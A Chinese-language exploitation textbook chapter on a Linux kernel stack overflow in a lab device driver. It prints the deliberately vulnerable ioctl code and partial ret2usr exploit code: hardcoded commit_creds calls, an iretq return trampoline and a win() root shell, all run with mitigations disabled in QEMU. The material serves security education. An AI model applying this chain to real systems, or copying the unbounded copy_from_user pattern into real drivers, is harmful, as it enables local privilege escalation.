# Ch 11 — Stack buffer overflow in kernel：canary 與第一次 ret2usr

> **目標**：把你在 user-space 早就會的 stack overflow，搬到 ring 0 重打一次。學完你要能在一個刻意卸下防禦的環境裡，用一次 kernel stack 溢位蓋掉 return address，讓 CPU 回到你安排的 user-space 程式碼執行 `commit_creds(prepare_kernel_cred(0))`，再乾淨地回到 shell。這是整本書第一條**完整的提權鏈**，也是後面所有 mitigation 章要逐層加回來「封住」的那條路。

> **環境**：Linux 6.6 LTS、x86-64、QEMU。本章**刻意**以 kernel cmdline `nokaslr nosmep nosmap` 跑（[Ch 0](./00-environment-setup.md) 教過怎麼設）。SMEP/SMAP 在 [Ch 13](./13-smep-smap.md) 加回來、KASLR 在 [Ch 14](./14-kaslr-infoleak.md) 加回來、KPTI 在 [Ch 15](./15-kpti.md)。本章所有 exploit code **未在本環境實測（kernel module 需自有 QEMU 靶）**，標示為理論預期行為，驗證方式見文末。

## 為什麼從 stack overflow 開始

因為它是你**已經有直覺**的那個洞。user-space 的 stack overflow 你大概早就打過：蓋 saved RIP、串 ROP、拿 shell。kernel stack overflow 的**底層原理一模一樣**——函式的 return address 躺在 stack 上，你寫超過區域變數的邊界就能蓋到它。

真正要重新校準的是**環境**，不是原理：

- 你現在跑在 ring 0。蓋掉 RIP 之後 CPU 執行的是 kernel 權限的指令——這既是威力（能改任何東西）也是陷阱（一步錯直接 kernel panic，整台機器掛掉，不像 user-space 只是 segfault 一個 process）。
- 「拿 shell」的意思變了。user-space 是 `execve("/bin/sh")`；kernel 提權是**把當前 process 的 credential 換成 root 的**，然後**回到** user-space，這時原本那個 process 已經是 root，再開 shell 就是 root shell。
- 收尾變得很重要。user-space exploit 崩了就崩了；kernel exploit 收尾沒做好，整台 VM 卡死，你連看輸出的機會都沒有。

所以本章把 mitigation 全關，先讓你把「溢位 → 控 RIP → 提權 → 回 user」這條鏈**跑通一次**，建立肌肉記憶。防禦是後面的事。

## 先建立直覺：kernel stack 長什麼樣

每個 thread 進 kernel 時用的不是 user 的 stack，而是一塊獨立的 **kernel stack**，大小固定（x86-64 上 `THREAD_SIZE` = 16 KB，即 4 個 page）。你的 syscall 跑在它上面。

```
  kernel stack（每 thread 一塊，16 KB，往低位長）
  高位址
  ┌─────────────────────────────┐
  │ pt_regs（進 kernel 時存的     │ ← 離開 kernel 時用它還原 user 狀態
  │ user 暫存器：ss sp rflags     │    （cs/ss/rflags/rsp/rip）
  │ cs rip ...）                 │
  ├─────────────────────────────┤
  │ ... 一層層 syscall 函式的      │
  │     stack frame ...          │
  ├─────────────────────────────┤
  │ 你的 vuln 函式 frame：        │
  │   [ saved RIP ]  ◀───────────┼── 目標：蓋掉它
  │   [ saved RBP ]              │
  │   [ canary ]    (若開)       │ ← STACKPROTECTOR 的哨兵
  │   [ char buf[64] ]  ◀────────┼── 從這裡開始往高位溢位
  └─────────────────────────────┘
  低位址
```

溢位 `buf` 往高位寫，依序經過 canary、saved RBP、saved RIP。和 user-space 完全同構——差別只在這塊 stack 的身分，以及蓋錯的後果是 panic 而非 segfault。

> 如果你對「syscall 進 kernel 時把 user 暫存器存到哪、怎麼還原」還不熟，先回看 [Ch 4](./04-syscall-boundary.md) 的 syscall ABI 一節。那裡的 `pt_regs` 就是這張圖最上面那塊。

## 靶：直接用 Ch 5 的 `vulndevice.c`

本章不另造輪子——靶就是 [Ch 5](./05-first-vulnerable-module.md) 建好的那個 `vulndevice.c`（`/dev/vulndevice`）。回憶它的形狀：它先把一個固定大小的 `struct vuln_req` 整個 `copy_from_user` 進來，再拿 `req.size`（**user 完全可控、沒有上界檢查**）當長度，把 user 的資料灌進一個 64 bytes 的 stack 陣列。核心那幾行是：

```c
/* vulndevice.c（Ch 5 建立；本章要打穿的就是它，節錄） */
#define STACK_BUF_SIZE 64
#define VULN_MAGIC 'v'
#define VULN_IOCTL_WRITE _IOW(VULN_MAGIC, 1, struct vuln_req)

struct vuln_req { unsigned long size; void __user *buf; };

static long vuln_do_write(struct vuln_req *req)
{
    char stack_buf[STACK_BUF_SIZE];     /* 64 bytes，就在 stack 上 */
    /* BUG：req->size 由 user 控，沒有 size <= STACK_BUF_SIZE 檢查 */
    if (copy_from_user(stack_buf, req->buf, req->size))   /* 溢位發生在這一行 */
        return -EFAULT;
    return 0;
}
```

bug 一眼可見：`req.size` 是 user 給的，`copy_from_user` 卻用它當長度把資料灌進 64 bytes 的 `stack_buf`。給 `size = 200`，就蓋過 canary、RBP、RIP。user 端透過 `ioctl(fd, VULN_IOCTL_WRITE, &req)` 觸發，其中 `req.buf` 指向我們排好的 payload、`req.size` 是 payload 長度。

> 這就是 [Ch 10](./10-vulnerability-taxonomy.md) 總表裡最左上那格：**OOB write，relative，長度與值皆可控**。在 stack 上，relative write 蓋到的「相鄰物件」正好是 saved RIP——所以它直接接近控制流那端，不用 grooming。

## 第一道牆：stack canary

先故意**開著** canary 跑一次，看它怎麼擋。`CONFIG_STACKPROTECTOR_STRONG` 會在有陣列的函式 prologue 塞一個哨兵值（canary），epilogue `ret` 前檢查它有沒有被動過：

```
函式進入：  canary = __stack_chk_guard;  存到 stack 上 buf 和 saved RIP 之間
函式返回前：若 stack 上的 canary != __stack_chk_guard
            → 呼叫 __stack_chk_fail() → panic（"Kernel stack is corrupted"）
```

你的溢位要蓋到 RIP，就一定會先蓋壞中間的 canary，於是 `ret` 之前就被抓包、直接 panic。故意跑這一遍的價值：你會**親眼看到** dmesg 噴 `stack-protector: Kernel stack is corrupted in: vuln_ioctl`，從此記住 canary 不是裝飾。

繞 canary 的標準思路有二，本章先用第一種、把第二種留到後面：

1. **別去蓋它**——如果 bug 是「寫特定 offset」而非「從頭連續覆蓋」，可以跳過 canary 只蓋 RIP。但本例是連續 `copy_from_user`，做不到。
2. **先 leak 它再原樣寫回**——用一個 info leak（[Ch 14](./14-kaslr-infoleak.md)）讀出 canary 值，溢位時把它填回原位，檢查就過了。這是真實題的常態。

為了先把提權鏈跑通，本章把 canary 一起關掉（`CONFIG_STACKPROTECTOR` 不開，或在教學靶裡用不含陣列的寫法避開），專心在 RIP 控制與提權。canary 的 leak-and-restore 在 Ch 14 補完整。

## 控到 RIP 之後：提權做什麼

拿到 RIP 控制，kernel pwn 的「標準第一招」是這一行：

```c
commit_creds(prepare_kernel_cred(NULL));
```

它做的事（[Ch 12](./12-control-flow-hijack.md) 會把機制講得更細）：

- `prepare_kernel_cred(NULL)`：產生一份全 0（uid=gid=0、全 capability）的 `struct cred`。
- `commit_creds(...)`：把它裝到 `current`（當前 process）上。

這一行跑完，**當前 process 就是 root**。注意它不開 shell、不做任何花俏的事——它只是改掉當前 process 的身分。所以真正拿到 root shell 的步驟是：提權 → **安全回到 user-space** → 原本那個呼叫 ioctl 的程式現在是 root，`system("/bin/sh")` 就是 root shell。

> `prepare_kernel_cred` 的參數在**較新的 kernel（5.19+）**語意有變：傳 `NULL` 與傳 `&init_task` 的行為在不同版本不同，有些版本傳 `NULL` 會以 `&init_task` 為樣板、有些要顯式傳。這是會隨版本改的 API——**以你的 kernel 原始碼為準**，別照抄舊 writeup 的 `prepare_kernel_cred(0)`。（本段依版本差異標注，未在本環境逐版實測。）

## ret2usr：讓 RIP 落到 user-space 程式碼

mitigation 全關（尤其 **SMEP 關**）的前提下，最簡單的做法是讓 kernel 的 RIP 直接**跳回一段 user-space 的函式**來執行提權——這就是 ret2usr（return-to-user）。為什麼能這樣？因為 SMEP 沒開時，ring 0 可以執行 user page 上的指令；KASLR 沒開時，`commit_creds` / `prepare_kernel_cred` 的位址是固定已知的。

```
  溢位把 saved RIP 蓋成 → user-space 函式 escalate() 的位址
  vuln_ioctl 執行 ret
       │ 此時仍在 ring 0
       ▼
  escalate()  （在 user 記憶體，但以 kernel 權限執行）
       commit_creds(prepare_kernel_cred(NULL));   ← 當前 process 變 root
       然後觸發「回 user-space」的收尾
       ▼
  回到 user-space 的 main，身分已是 root → system("/bin/sh")
```

user 端的提權函式（位址在 `nokaslr` 下固定，可從 `/proc/kallsyms` 或 gdb 查，寫死進 exploit）：

```c
/* exploit.c（節錄）：以 kernel 權限執行的提權函式 */

/* 這兩個位址：nokaslr 下固定；用 `sudo grep -E " (commit_creds|prepare_kernel_cred)$" \
   /proc/kallsyms` 或在 QEMU 用 gdb 查符號取得，依你的 kernel 填入 */
void *(*prepare_kernel_cred)(void *) = (void *)0xffffffff81xxxxxx; /* 依實測填入 */
void  (*commit_creds)(void *)        = (void *)0xffffffff81yyyyyy; /* 依實測填入 */

void escalate(void)                 /* ret2usr 的落點，以 ring 0 執行 */
{
    commit_creds(prepare_kernel_cred(NULL));
    /* 接著要「回 user」——見下一節的 trampoline */
}
```

> 把位址寫死是**教學簡化**，只在 `nokaslr` 成立。真實題一定開 KASLR，`escalate` 裡的函式位址要先 leak kernel base 再動態算（[Ch 14](./14-kaslr-infoleak.md)）。本書刻意分階段：先控流與提權，再把隨機化加回來。

## 最容易卡死的一步：乾淨回到 user-space

提權完不能直接 `return`——你是從 `vuln_ioctl` 中途劫走的，stack 已經被你蓋爛，正常返回路徑回不去。要**手動重建**離開 kernel 的狀態：把 CPU 切回 ring 3，並還原 user 的 `cs/ss/rflags/rsp/rip`。x86-64 的做法是自己擺好 `iretq` 需要的 5 個值然後 `iretq`：

```c
/* 進 escalate 之前，先把「回 user 之後要落在哪」的狀態存起來 */
unsigned long user_rip, user_cs, user_rflags, user_sp, user_ss;

static void save_state(void)        /* exploit 一開始就呼叫 */
{
    __asm__ volatile(
        "movq %%cs,  %0\n"
        "movq %%ss,  %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags));
    user_rip = (unsigned long)&win;  /* 回 user 後落在 win()，在那裡開 shell */
}

/* escalate() 結尾接這段：手動 iretq 回 ring 3 */
__asm__ volatile(
    "swapgs\n"                        /* 切回 user 的 GS base */
    "movq %0, 0x20(%%rsp)\n"          /* 擺 iretq frame（ss/sp/rflags/cs/rip）*/
    ...                               /* 省略：把 5 個值 push 成 iretq frame */
    "iretq\n" :: "r"(user_ss) /* ... */);
```

這段 trampoline 的細節（為什麼要 `swapgs`、`iretq` frame 的順序、KPTI 開了之後為什麼這招不夠）全部在 [Ch 12](./12-control-flow-hijack.md) 和 [Ch 15](./15-kpti.md) 展開。本章先給「全關 mitigation 下能動的最小版本」，讓你看到鏈收口在 `win()`：

```c
void win(void)                        /* 回到 user-space、已是 root */
{
    if (getuid() == 0) {
        puts("[+] got root");
        system("/bin/sh");
    }
}
```

## 組起來：完整鏈的形狀

```
save_state()                 存 user 的 cs/ss/rflags/sp，設定回來落在 win()
   │
build payload（放進 req.buf 指向的緩衝區）：
   [ 64 bytes 填充 stack_buf ]
   [ 8 bytes 蓋 saved RBP ]
   [ escalate 的位址 ]  ◀── 蓋掉 saved RIP
   │
req = { .size = payload_len, .buf = payload };
ioctl(fd, VULN_IOCTL_WRITE, &req)         觸發溢位
   │ vuln_do_write 執行 ret → 跳到 escalate()（ring 0）
   ▼
escalate()：commit_creds(prepare_kernel_cred(NULL)) → 當前 process 變 root
   │ swapgs + iretq
   ▼
win()（ring 3，已 root）→ system("/bin/sh")
```

十幾行 payload，一次 ioctl。這就是 kernel pwn 的「hello world」。把它跑通，你對 kernel 位址、ring 切換、iretq frame 的手感就建立起來了——後面每一章都是在這條鏈的某一段加一道牆、再教你怎麼翻過去。

## 踩雷集錦

1. **忘了 `save_state`／在溢位後才存狀態**——user 暫存器必須在**觸發 bug 之前**存好。bug 觸發後你人已經在 kernel、stack 爛了，再去讀 `%cs`/`%rsp` 拿到的是錯的，`iretq` 回去直接 panic。順序是鐵律。
2. **把 panic 當成「沒打中」**——dmesg 噴 `stack-protector: Kernel stack is corrupted` 代表你**蓋到了**，只是撞上 canary；噴 `unable to handle page fault` / `BUG: unable to handle` 代表 RIP 已被你控、但落點不對（位址填錯或 SMEP 擋）。panic 的**訊息**會告訴你走到哪一步，別一看 panic 就全部重來——讀它。
3. **`prepare_kernel_cred(0)` 照抄舊 writeup**——這個 API 的參數語意 5.19 前後有變（見前文）。新 kernel 上照舊寫可能拿到的不是全 0 cred，提權「成功」了 `getuid()` 卻不是 0。以你的 kernel source 為準。
4. **以為 ret2usr 是通用招**——它**只在 SMEP 關**時能用。真實環境 SMEP 預設開，kernel 不能執行 user page，`escalate` 一跑就 fault。本章能用純粹因為 `nosmep`；[Ch 13](./13-smep-smap.md) 一開 SMEP，整條路就得換成 kernel ROP。別把這章的 ret2usr 當成以後都能用的模板。
5. **回 user 後在 `win` 裡才檢查 `getuid()` 失敗就以為提權沒成**——也可能是**回 user 的 trampoline** 錯了（落點、swapgs、iretq frame），process 根本沒乾淨回來、或回到錯的地方。把提權和回程當兩個獨立的 bug 分開除錯：先用 gdb 確認 `commit_creds` 真的被呼叫、cred 真的換了，再查回程。

## 進階：真實題會把這章的每個簡化收回去

本章為了讓鏈先跑通，做了四個簡化，每一個都對應後面一章把它收回：

| 本章簡化 | 真實情況 | 補在哪 |
|---|---|---|
| `nokaslr`，位址寫死 | KASLR 開，要先 leak kernel base | [Ch 14](./14-kaslr-infoleak.md) |
| `nosmep`，用 ret2usr | SMEP 開，kernel 不能跑 user code，改 kernel ROP | [Ch 13](./13-smep-smap.md) |
| canary 關掉 | canary 開，要 leak 後原樣寫回 | [Ch 14](./14-kaslr-infoleak.md) |
| 簡化的 iretq 回程 | KPTI 開，要走 trampoline 或 signal 回程 | [Ch 15](./15-kpti.md) |

真正的練習 B（[practice-b](./practice-b-stack-to-root.md)）會把這四道牆**一次全開**，逼你把 Ch 11–15 的東西串起來。本章先確保單項能動。

此外，`commit_creds(prepare_kernel_cred(NULL))` 不是唯一提權路。拿到任意寫之後也可以**直接改 `cred` struct 的 uid 欄位**、或走 `modprobe_path` / `core_pattern`（[Ch 16](./16-classic-primitives.md)）——那些路在你**沒有乾淨的 RIP 控制、只有任意寫**時更好用。本章走函式呼叫版，是因為 stack overflow 天生給你乾淨的 RIP。

## 動手練習

在你自有的 QEMU 靶上（[Ch 0](./00-environment-setup.md) 的環境），分三步驗證，別一次全上：

1. **先證明能控 RIP**：payload 把 saved RIP 蓋成一個好認的值（如 `0x4141414141414141`），`ioctl` 後看 dmesg 的 fault 是不是 `RIP: 0010:0x4141414141414141`。看到了，代表控制流到手。
2. **再證明能提權**：RIP 蓋成 `escalate`，在 `escalate` 裡先不回 user、只 `commit_creds(prepare_kernel_cred(NULL))` 然後停住（故意讓它 fault），用 gdb 下斷點確認 `commit_creds` 被呼叫、`current->cred` 的 uid 變 0。
3. **最後接回程**：補上 `save_state` + swapgs + iretq，讓它乾淨回 `win()`，拿 root shell。

每一步單獨成立再往下。這個「分段驗證」的紀律，到了開 mitigation 的真實題會救你很多次。

## 本章重點整理

- kernel stack overflow 原理同 user-space：蓋 `buf` 旁的 saved RIP；差別在身分（ring 0）與後果（panic 非 segfault）。
- 提權的標準第一招是 `commit_creds(prepare_kernel_cred(NULL))`——改當前 process 身分，**不**開 shell。
- 真正拿 shell 靠「提權 → 乾淨回 user → 原 process 已 root」，回程（swapgs/iretq）是最容易卡死的一步，狀態要在觸發前存好。
- ret2usr **只在 SMEP 關**時可用；canary、KASLR、KPTI 本章刻意關掉，後面逐章加回。
- 讀 panic 訊息判斷走到哪一步，別一 panic 就重來。

## 自我檢核

- [ ] 不看筆記，能畫出 kernel stack 上 `buf → canary → saved RBP → saved RIP` 的布局，並說出溢位蓋到哪個才控流
- [ ] 能解釋為什麼 `commit_creds(prepare_kernel_cred(NULL))` 之後還要「回 user」才拿得到 shell
- [ ] 能說出為什麼 `save_state` 一定要在觸發 bug 之前做
- [ ] 知道 ret2usr 依賴哪一個 mitigation 關閉，以及它一旦開了這招為什麼失效
- [ ] 看到 dmesg 的 `stack-protector: corrupted` 與 `unable to handle page fault`，能分辨各自代表鏈走到哪一步

## 延伸閱讀

- **[pawnyable — Linux Kernel: Holstein（Stack Overflow）](https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html)**
  - **這篇說什麼**：用一個和本章幾乎同構的靶，逐步示範 ret2usr、ret2usr 失敗後的 ROP、以及回程 trampoline，附可下載的 module 與 exploit。
  - **讀哪裡**：整篇；「Return to user」與「KPTI」兩節正好對應本章 Ch 12/15 的銜接。
  - **為什麼值得讀**：目前把「第一次 kernel 提權」講得最手把手的教材，靶可直接拿來當本章的實作環境。
- **[commit_creds / prepare_kernel_cred 原始碼（kernel/cred.c）](https://elixir.bootlin.com/linux/v6.6/source/kernel/cred.c)**
  - **讀哪裡**：`prepare_kernel_cred` 與 `commit_creds` 兩個函式本體，看它實際怎麼產生與安裝 cred。
  - **和本章的關聯**：本章「提權就是換 cred」的說法，讀這段 source 才會從「背一行咒語」變成「知道那行幹嘛」；也能看清版本間參數語意的差異。
- **[The Linux Kernel Module Programming Guide](https://sysprog21.github.io/lkmpg/)**
  - **讀哪裡**：character device 與 ioctl 兩章；本章的 vuln 靶就是它的變體。
  - **前提知識**：會 C 即可。先把這裡的 module 編出來、載得進去，再回來放 bug。

下一章把「拿到 RIP 之後」這半段獨立出來講透——提權的機制、以及那段最難搞的回程 trampoline，到底每一步在對 CPU 做什麼。

→ [Ch 12 — 控制流劫持基礎：劫 RIP、commit_creds(prepare_kernel_cred(0))、安全回 userland](./12-control-flow-hijack.md)
